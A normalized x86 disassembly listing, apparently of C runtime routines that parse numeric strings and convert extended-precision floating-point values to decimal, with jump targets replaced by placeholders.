movsd [ edi ] [ esi ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x34 ] eax
mov eax ecx
cdq
push 0x1f
movsd [ edi ] [ esi ]
pop esi
and edx esi
add edx eax
sar edx 0x5
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x3c ] edx
and ecx 0x8000001f
jns r-xdata
mov esi ebx
mov eax ebx
sub esi ecx
xor eax eax
inc eax
mov ecx esi
shl eax cl
push 0x3
or edi 0xffffffff
mov [ ebp - 0x30 ] esi
pop esi
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
inc eax
cmp eax 0x3
jl r-xdata
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
lea eax [ edx + 0x1 ]
cmp eax esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov edi [ ebp - 0x40 ]
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
cmp [ ebp - 0x2c ] ebx
je r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + eax * 4 ]
sub ecx eax
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ edi + 0x4 ] esi
mov [ edi ] eax
jmp r-xdata
push 0x1f
pop eax
sub eax [ rw-data ]
mov ecx eax
mov eax [ ebp - 0x44 ]
shl esi cl
neg eax
sbb eax eax
and eax 0x80000000
or esi eax
mov eax [ rw-data ]
or esi [ ebp - 0x10 ]
cmp eax 0x40
jne r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp ecx eax
jge r-xdata
inc ecx
mov eax [ ebp - 0x34 ]
cdq
push 0x1f
pop ecx
and edx ecx
add edx eax
mov eax [ ebp - 0x34 ]
sar edx 0x5
and eax 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
mov [ edi ] esi
cmp ecx edx
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
sub ecx eax
xor eax eax
inc eax
shl eax cl
push 0xffffffff
mov [ ebp - 0x2c ] ebx
pop edi
mov [ ebp - 0x38 ] eax
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx [ ebp - 0x38 ]
add ecx eax
mov [ ebp - 0x28 ] ecx
cmp ecx eax
mov eax [ ebp - 0x28 ]
mov ecx ebx
jb r-xdata
dec eax
or eax 0xffffffe0
inc eax
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
cmp ecx [ rw-data ]
jl r-xdata
sub edx [ ebp - 0x24 ]
lea esi [ ebp - 0x1c ]
mov [ ebp - 0x30 ] edx
mov eax edx
cdq
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
and edx 0x1f
add eax edx
sar eax 0x5
movsd [ edi ] [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
and eax 0x8000001f
jns r-xdata
push 0x2
pop ebx
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax [ ebp - 0x38 ]
jae r-xdata
mov edx [ ebp - 0x3c ]
mov esi [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
add esi ecx
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
mov ecx [ rw-data ]
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x34 ] eax
and ecx 0x8000001f
jns r-xdata
mov [ ebp - 0x30 ] eax
or edi 0xffffffff
mov eax edi
mov edi [ ebp - 0x30 ]
mov ecx edi
shl eax cl
push 0x20
mov [ ebp - 0x20 ] ebx
not eax
mov [ ebp - 0x28 ] eax
pop eax
sub eax edi
push 0x3
mov [ ebp - 0x38 ] eax
pop esi
dec eax
or eax 0xffffffe0
inc eax
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
js r-xdata
shl edi cl
push 0x20
mov [ ebp - 0x20 ] ebx
mov esi ebx
pop eax
mov ebx ecx
sub eax ebx
mov [ ebp - 0x24 ] ecx
not edi
mov [ ebp - 0x24 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
or edi 0xffffffff
shl edi cl
push 0x20
pop eax
sub eax ecx
mov [ ebp - 0x38 ] ecx
not edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov eax edx
and eax [ ebp - 0x28 ]
mov ecx edi
shr edx cl
mov ecx [ ebp - 0x38 ]
shl eax cl
or edx [ ebp - 0x20 ]
inc ebx
mov [ ebp + ebx * 4 - 0x14 ] edx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov eax [ ebp - 0x3c ]
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
mov eax [ ebp - 0x3c ]
xor ebx ebx
pop ecx
or edi 0xffffffff
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] edi
mov eax edi
jb r-xdata
mov edx [ ebp + esi * 4 - 0x10 ]
mov eax edx
mov ecx ebx
shr edx cl
mov ecx [ ebp - 0x24 ]
and eax edi
shl eax cl
or edx [ ebp - 0x20 ]
inc esi
mov [ ebp + esi * 4 - 0x14 ] edx
mov [ ebp - 0x20 ] eax
cmp esi 0x3
jl r-xdata
mov edi [ ebp - 0x28 ]
mov esi [ ebp - 0x38 ]
mov eax edi
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
pop ecx
xor ebx ebx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov eax edx
shr edx cl
mov ecx [ ebp - 0x28 ]
and eax edi
shl eax cl
or edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x38 ]
mov [ ebp + ebx * 4 - 0x10 ] edx
inc ebx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov esi [ ebp - 0x34 ]
mov eax esi
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
pop ecx
xor ebx ebx
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
mov eax [ ebp - 0x3c ]
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax 0x1
jae r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
cmp ecx eax
jl r-xdata
mov ecx [ ebp - 0x34 ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add edx eax
sar edx 0x5
mov [ ebp - 0x2c ] edx
and ecx 0x8000001f
jns r-xdata
sub edx 0x4
dec ecx
jns r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
jns r-xdata
cmp ecx edi
jl r-xdata
sub edx 0x4
dec ecx
jns r-xdata
cmp ecx esi
jl r-xdata
mov esi [ rw-data ]
add esi [ rw-data ]
xor ebx ebx
inc ebx
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
push 0x1f
pop eax
sub eax ecx
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
xor eax eax
inc eax
shl eax cl
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
inc edx
cmp edx esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + edx * 4 ]
sub ecx edx
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
mov [ ebp - 0x24 ] ecx
shl edi cl
mov eax ebx
push 0x20
mov [ ebp - 0x20 ] ebx
mov ebx [ ebp - 0x24 ]
pop ecx
sub ecx ebx
not edi
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x24 ] ecx
dec ecx
or ecx 0xffffffe0
inc ecx
mov edi [ ebp - 0x34 ]
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add edx eax
sar edx 0x5
and edi 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov edx [ ebp + eax * 4 - 0x10 ]
mov eax edx
mov ecx ebx
shr edx cl
mov ecx [ ebp - 0x34 ]
and eax edi
or edx [ ebp - 0x20 ]
mov [ ebp + ecx * 4 - 0x10 ] edx
mov ecx [ ebp - 0x24 ]
shl eax cl
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x34 ] eax
cmp eax esi
jl r-xdata
mov esi [ ebp - 0x28 ]
mov eax esi
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
pop ecx
xor ebx ebx
mov eax [ ebp + edx * 4 - 0x10 ]
sub ecx edi
xor edi edi
inc edi
shl edi cl
push 0xffffffff
mov ecx ebx
mov [ ebp - 0x24 ] edi
add edi eax
mov [ ebp - 0x20 ] edi
cmp edi eax
mov eax [ ebp - 0x20 ]
pop edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp eax [ ebp - 0x24 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
cmp ecx esi
jl r-xdata
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
js r-xdata
mov esi ebx
jmp r-xdata
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x20 ] edi
mov eax edi
jb r-xdata
xor ecx ecx
inc ecx
cmp eax 0x1
jae r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
jns r-xdata
sub_42e84c
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x68 ] eax
xor eax eax
push ebx
xor ebx ebx
inc eax
push esi
mov [ ebp - 0x60 ] eax
mov eax ebx
push edi
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov esi ebx
mov [ ebp - 0x54 ] ebx
cmp [ ebp + 0x24 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov edx ecx
mov [ ebp - 0x50 ] edx
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
xor eax eax
jmp r-xdata
inc ecx
jmp r-xdata
cmp dl 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
mov dl [ ecx ]
cmp dl 0x20
je r-xdata
cmp dl 0xa
je r-xdata
cmp dl 0xd
jne r-xdata
mov dl [ ecx ]
inc ecx
cmp eax 0xb
ja r-xdata
cmp eax 0xa
jne r-xdata
jmp [ eax * 4 + jump_table_42ef98 ]
jmp r-xdata
lea eax [ edx - 0x31 ]
cmp al 0x8
ja r-xdata
xor eax eax
inc eax
mov [ ebp - 0x64 ] eax
lea eax [ edx - 0x31 ]
cmp al 0x8
jbe r-xdata
lea eax [ edx - 0x31 ]
cmp al 0x8
jbe r-xdata
xor eax eax
inc eax
mov [ ebp - 0x64 ] eax
cmp dl 0x30
jl r-xdata
xor eax eax
inc eax
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x4c ]
test eax eax
jne r-xdata
xor eax eax
inc eax
sub dl 0x30
mov [ ebp - 0x58 ] eax
cmp dl 0x9
ja r-xdata
lea eax [ ecx - 0x2 ]
mov [ ebp - 0x50 ] eax
lea eax [ edx - 0x31 ]
cmp al 0x8
ja r-xdata
xor eax eax
inc eax
mov [ ebp - 0x5c ] eax
jmp r-xdata
lea eax [ edx - 0x31 ]
cmp al 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] ebx
je r-xdata
xor eax eax
inc eax
mov [ ebp - 0x5c ] eax
mov esi ebx
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp dl [ eax ]
jne r-xdata
push 0x3
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp dl [ eax ]
jne r-xdata
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp dl [ eax ]
je r-xdata
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp dl [ eax ]
je r-xdata
mov eax [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
cmp dl 0x30
cmp dl 0x30
jne r-xdata
mov ecx [ ebp - 0x50 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax dl
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp dl 0x30
je r-xdata
cmp dl 0x30
jmp r-xdata
push 0xa
pop eax
dec ecx
lea eax [ ecx - 0x1 ]
mov [ ebp - 0x50 ] eax
movsx eax dl
sub eax 0x2b
je r-xdata
cmp dl 0x30
jge r-xdata
mov eax ebx
mov esi ebx
push 0x4
cmp eax 0x18
jbe r-xdata
movsx eax dl
sub eax 0x2b
je r-xdata
push 0x5
cmp dl 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp dl 0x30
je r-xdata
cmp dl 0x2b
je r-xdata
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x4c ] eax
mov esi ebx
cmp eax 0x19
jae r-xdata
cmp dl 0x2b
je r-xdata
mov esi [ ebp - 0x54 ]
jl r-xdata
mov eax [ ebp - 0x54 ]
pop eax
dec ecx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov dl [ ecx ]
inc ecx
sub dl 0x31
cmp dl 0x8
ja r-xdata
jne r-xdata
dec eax
dec eax
jne r-xdata
cmp dl 0x39
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x54 ]
mov al [ ebp - 0x9 ]
cmp al 0x5
jl r-xdata
push 0x2
pop eax
mov [ ebp - 0x6c ] ebx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec ecx
push 0xb
jmp r-xdata
cmp dl 0x2d
je r-xdata
pop eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp dl 0x2d
je r-xdata
inc esi
sub dl 0x30
inc eax
mov [ edi ] dl
inc edi
jmp r-xdata
cmp dl 0x2d
je r-xdata
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x4c ] eax
mov esi ebx
cmp eax 0x19
jae r-xdata
mov dl [ ecx ]
dec eax
inc ecx
cmp dl 0x30
je r-xdata
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x4c ]
push 0x7
or edx 0xffffffff
pop eax
mov [ ebp - 0x60 ] edx
jmp r-xdata
sub eax 0x3
dec ecx
jmp r-xdata
push 0x8
jmp r-xdata
or [ ebp - 0x60 ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
cmp dl 0x30
jge r-xdata
imul esi esi 0xa
movsx eax dl
add esi 0xffffffd0
add esi eax
cmp esi 0x1450
jg r-xdata
mov ecx ebx
mov eax ebx
mov esi ebx
mov edx ebx
jmp r-xdata
dec edi
cmp [ edi ] bl
jne r-xdata
mov ecx [ ebp - 0x54 ]
dec edi
push 0x18
inc ecx
pop eax
mov [ ebp - 0x54 ] ecx
jmp r-xdata
inc al
mov [ ebp - 0x9 ] al
push 0x2
mov edx 0x8000
pop eax
mov [ ebp - 0x6c ] edx
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp dl 0x30
je r-xdata
jmp r-xdata
cmp dl 0x39
jg r-xdata
mov dl [ ecx ]
inc ecx
cmp dl 0x30
jge r-xdata
cmp dl 0x43
jle r-xdata
mov dl [ ecx ]
inc ecx
cmp dl 0x30
jge r-xdata
sub dl 0x30
inc eax
mov [ edi ] dl
inc edi
dec esi
cmp dl 0x39
jg r-xdata
mov esi 0x1451
jmp r-xdata
mov dl [ ecx ]
inc ecx
mov edi [ ebp - 0x74 ]
or eax [ ebp - 0x6c ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov [ edi + 0x2 ] edx
mov [ edi + 0x6 ] esi
mov eax ebx
lea ecx [ ebp - 0x3c ]
push ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_42fe31
mov edx [ ebp - 0x60 ]
add esp 0xc
test edx edx
jns r-xdata
dec eax
inc ecx
dec edi
cmp [ edi ] bl
je r-xdata
test eax eax
je r-xdata
cmp dl 0x43
jle r-xdata
dec ecx
jmp r-xdata
cmp dl 0x45
jle r-xdata
cmp dl 0x39
jg r-xdata
mov dl [ ecx ]
inc ecx
mov eax [ ebp - 0x5c ]
add esi [ ebp - 0x54 ]
test eax eax
jne r-xdata
neg esi
mov [ ebp - 0x54 ] ecx
cmp dl 0x45
jle r-xdata
mov edx [ ebp - 0x68 ]
mov [ edx ] ecx
mov ecx [ ebp - 0x64 ]
test ecx ecx
je r-xdata
push 0x6
jmp r-xdata
sub dl 0x64
cmp dl 0x1
jbe r-xdata
mov eax [ ebp - 0x58 ]
test eax eax
jne r-xdata
add esi [ ebp + 0x18 ]
sub dl 0x64
cmp dl 0x1
ja r-xdata
cmp esi 0x1450
jg r-xdata
sub esi [ ebp + 0x1c ]
mov eax 0x7fff
mov esi 0x80000000
push 0x2
jmp r-xdata
cmp esi 0xffffebb0
jl r-xdata
mov ecx ebx
mov edx ebx
pop ebx
xor edi edi
mov ecx ebx
mov eax ebx
mov esi ebx
mov edx ebx
lea ebx [ edi + 0x1 ]
jmp r-xdata
mov eax rw-data
sub eax 0x60
test esi esi
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x3a ]
mov esi [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jns r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov eax rw-data
neg esi
sub eax 0x60
test esi esi
jne r-xdata
xor ecx ecx
mov [ ebp - 0x3c ] cx
jmp r-xdata
mov ecx esi
add eax 0x54
sar esi 0x3
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x54 ] esi
and ecx 0x7
je r-xdata
imul ecx ecx 0xc
add ecx eax
mov eax 0x8000
mov [ ebp - 0x50 ] ecx
cmp [ ecx ] ax
jb r-xdata
movzx edi [ ecx + 0xa ]
mov edx [ ebp - 0x32 ]
mov eax edi
xor eax edx
and eax 0x8000
mov [ ebp - 0x60 ] eax
mov eax 0x7fff
and edx eax
and edi eax
mov [ ebp - 0x78 ] ebx
lea eax [ edi + edx ]
movzx esi ax
mov eax 0x7fff
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x5c ] esi
cmp dx ax
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ecx [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
mov [ ebp - 0x50 ] ecx
xor eax eax
cmp [ ebp - 0x60 ] ax
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x34 ] eax
cmp di ax
jae r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
test dx dx
jne r-xdata
mov [ ebp - 0x34 ] ebx
jmp r-xdata
test di di
jne r-xdata
inc esi
test [ ebp - 0x34 ] 0x7fffffff
mov [ ebp - 0x5c ] esi
jne r-xdata
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
push 0x5
mov eax ebx
pop edi
mov [ ebp - 0x70 ] eax
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x68 ] edi
inc esi
test [ ecx + 0x8 ] 0x7fffffff
mov [ ebp - 0x5c ] esi
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
add edx 0x2
inc eax
dec edi
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x68 ] edi
test edi edi
jg r-xdata
lea esi [ ebp - 0x3c ]
lea esi [ esi + eax * 2 ]
lea eax [ ecx + 0x8 ]
mov [ ebp - 0x64 ] eax
mov ecx edi
cmp [ ecx + 0x4 ] ebx
jne r-xdata
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov [ ebp - 0x58 ] edi
test edi edi
jle r-xdata
mov esi [ ebp - 0x5c ]
mov edx [ ebp - 0x24 ]
mov edi [ ebp - 0x2c ]
add esi 0xc002
mov [ ebp - 0x50 ] edx
test si si
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp edi [ ebp - 0x58 ]
jae r-xdata
cmp [ ecx ] ebx
je r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
mov eax 0xffff
add esi eax
test si si
jns r-xdata
test edx edx
js r-xdata
mov [ edx - 0x4 ] edi
test eax eax
je r-xdata
mov eax [ ebp - 0x7c ]
mov eax [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
mov ax [ ebp - 0x2c ]
mov ebx [ ebp - 0x78 ]
mov eax esi
neg eax
movzx eax ax
mov [ ebp - 0x68 ] eax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0x28 ]
mov ecx eax
mov edx edi
shr edx 0x1f
add eax eax
or eax edx
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x28 ] eax
shr ecx 0x1f
add edx edx
mov eax 0xffff
or edx ecx
add edi edi
add esi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x24 ] edx
test si si
jg r-xdata
mov eax [ ebp - 0x64 ]
sub eax 0x2
add esi 0x2
dec ecx
mov [ ebp - 0x64 ] eax
test ecx ecx
jg r-xdata
inc [ edx ]
mov eax [ ebp - 0x2a ]
cmp eax 0xffffffff
jne r-xdata
and edi 0x1ffff
cmp edi 0x18000
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov eax edx
shl eax 0x1f
mov [ ebp - 0x50 ] ecx
shr [ ebp - 0x50 ] 0x1
or [ ebp - 0x50 ] eax
mov eax [ ebp - 0x50 ]
shl ecx 0x1f
shr edi 0x1
shr edx 0x1
or edi ecx
dec [ ebp - 0x68 ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] edi
jne r-xdata
inc ebx
movzx eax [ eax ]
mov [ ebp - 0x58 ] eax
movzx eax [ esi ]
mov edi [ ebp - 0x58 ]
imul edi eax
mov [ ebp - 0x58 ] edi
add edi [ edx - 0x4 ]
mov [ ebp - 0x7c ] ebx
cmp edi [ edx - 0x4 ]
jb r-xdata
mov ecx [ ebp - 0x50 ]
mov edi [ ebp - 0x68 ]
mov eax [ ebp - 0x70 ]
inc eax
mov [ ebp - 0x2a ] eax
mov eax [ ebp - 0x26 ]
mov [ ebp - 0x2a ] ebx
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x50 ]
test [ ebp - 0x2c ] 0x1
je r-xdata
push 0x0
test ebx ebx
mov [ ebp - 0x50 ] edx
pop ebx
je r-xdata
mov ax [ ebp - 0x2a ]
or esi [ ebp - 0x60 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov [ ebp - 0x36 ] ecx
mov [ ebp - 0x32 ] si
jmp r-xdata
inc eax
mov [ ebp - 0x26 ] eax
mov ax [ ebp - 0x22 ]
mov ecx 0xffff
mov [ ebp - 0x26 ] ebx
cmp ax cx
jne r-xdata
mov ax di
xor edi edi
inc edi
or ax di
mov [ ebp - 0x2c ] ax
mov edi [ ebp - 0x2c ]
jmp r-xdata
mov edx 0x7fff
cmp si dx
jae r-xdata
inc ax
mov [ ebp - 0x22 ] ax
jmp r-xdata
mov [ ebp - 0x22 ] dx
inc esi
jmp r-xdata
mov edx 0x8000
cmp ax dx
ja r-xdata
mov ecx [ ebp - 0x24 ]
jmp r-xdata
sub_42efc8
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov esi 0x8000
and edx esi
movzx esi [ ebp + 0x10 ]
xor ecx ecx
mov eax 0x7fff
inc ecx
and esi eax
push edi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x78 ] edx
mov [ ebp - 0x68 ] eax
test dx dx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp si ax
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp + 0xc ]
test si si
jne r-xdata
movzx edx si
mov eax edx
imul edx edx 0x4d10
shr eax 0x8
mov ecx edi
shr ecx 0x18
add edx 0xecbced0c
lea eax [ eax + ecx * 2 ]
imul eax eax 0x4d
add eax edx
sar eax 0x10
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1e ] eax
xor eax eax
mov [ ebp - 0x48 ] ecx
movsx ecx cx
mov [ ebp - 0x20 ] ax
neg ecx
mov eax rw-data
sub eax 0x60
xor ebx ebx
mov [ ebp - 0x16 ] si
mov [ ebp - 0x1a ] edi
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x5c ] 0x5
mov [ ebp - 0x6c ] 0xbffd
mov [ ebp - 0x58 ] 0x3fbf
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
mov edx 0x80000000
mov [ ebx ] cx
mov ecx [ ebp + 0x8 ]
cmp eax edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov edx [ ebp - 0x1c ]
mov esi [ ebp - 0x20 ]
jns r-xdata
test eax 0x40000000
jne r-xdata
test ecx ecx
je r-xdata
xor eax eax
mov [ ebx ] ax
mov eax 0x8000
cmp dx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] cl
mov [ ebx + 0x4 ] 0x30
mov eax ecx
jmp r-xdata
test [ ebp + 0x18 ] 0x1
mov ecx [ ebp - 0x70 ]
mov eax [ ebp - 0x48 ]
mov edi [ ebp + 0x14 ]
mov [ ecx ] ax
je r-xdata
inc [ ebp - 0x48 ]
mov ecx eax
mov eax [ ebp - 0x26 ]
mov edi eax
xor edi ecx
and edi 0x8000
mov [ ebp - 0x54 ] edi
mov edi 0x7fff
and eax edi
and ecx edi
mov [ ebp - 0x74 ] eax
add eax ecx
movzx edi ax
mov eax 0x7fff
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4c ] edi
cmp cx ax
jae r-xdata
je r-xdata
neg ecx
mov eax rw-data
sub eax 0x60
mov [ ebp - 0x44 ] ecx
test ecx ecx
cmp [ ebp - 0x78 ] 0x0
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
mov [ ebp - 0x48 ] edi
cwde
add edi eax
mov [ ebp - 0x48 ] edi
test edi edi
jg r-xdata
xor eax eax
cmp [ ebp - 0x54 ] ax
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x74 ]
cmp ax [ ebp - 0x68 ]
jae r-xdata
mov esi [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
